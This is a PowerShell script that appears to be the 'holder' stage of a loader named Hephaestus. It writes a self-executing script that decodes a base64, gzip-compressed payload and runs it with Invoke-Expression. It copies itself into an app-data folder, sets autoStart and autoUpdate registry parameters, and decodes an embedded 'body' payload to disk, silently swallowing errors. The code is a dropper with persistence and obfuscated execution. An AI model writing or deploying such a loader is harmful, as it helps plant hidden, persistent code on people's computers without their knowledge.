. ./utils.ps1
. ./holder/consts_autoextract.ps1
. ./consts_body.ps1

function checkFolder {
    $appDataFolder = Get-HephaestusFolder
    if (-not (Test-Path -Path $appDataFolder))
    {
        New-Item -Path $appDataFolder -ItemType Directory | Out-Null
    }
}


function extract_holder()
{
    $holderFile = Get-HolderPath
    if ([string]::IsNullOrEmpty($EncodedScript) -eq $false)
    {
        $content = @"
        `$EncodedScript = `"$EncodedScript`"
        
        `$CompressedBytes = [Convert]::FromBase64String(`$EncodedScript)
        `$MemoryStream = New-Object System.IO.MemoryStream(, `$CompressedBytes)
        `$GzipStream = New-Object System.IO.Compression.GzipStream(`$MemoryStream, [System.IO.Compression.CompressionMode]::Decompress)
        `$StreamReader = New-Object System.IO.StreamReader(`$GzipStream, [System.Text.Encoding]::UTF8)
        `$data = `$StreamReader.ReadToEnd()
        `$DecodedScript = "
"@  
        $content = $content + "`$EncodedScript + `$EncodedScript + [Environment]::NewLine + `$data"
        
        $content = $content + "Invoke-Expression `$DecodedScript"


        writedbg "extract_holder encodedScript"
        Set-Content -Path $holderFile -Value $content 
        return
    }
    $curScript = Get-ScriptPath
    $pathOrData = $global:MyInvocation.MyCommand.Definition
    try
    {
        if ($pathOrData.Length -gt 500)
        {
            writedbg "extract_holder pathOrData"
            [System.IO.File]::WriteAllText($holderFile, $pathOrData)
        } 
        else 
        {
            if ($curScript -ne $holderFile)
            {
                Copy-Item -Path $curScript -Destination $holderFile -Force
            }
        } 
    }
    catch
    {
    }
    try 
    {
        RegWriteParamBool -keyName "autoStart" -value $server.autoStart    
        RegWriteParamBool -keyName "autoUpdate" -value $server.autoUpdate
        RegWriteParam -keyName "trackSerie" -value $server.trackSerie
    }
    catch {
      
    }
}

function extract_body()
{
    $holderBodyFile = Get-BodyPath
    if (-not (Test-Path -Path $holderBodyFile))
    {
        CustomDecode -inContent $xbody -outFile $holderBodyFile
    }
}

function Initialization() 
{
    writedbg "holder initialization"
    checkFolder
    extract_holder
    extract_body
}

Initialization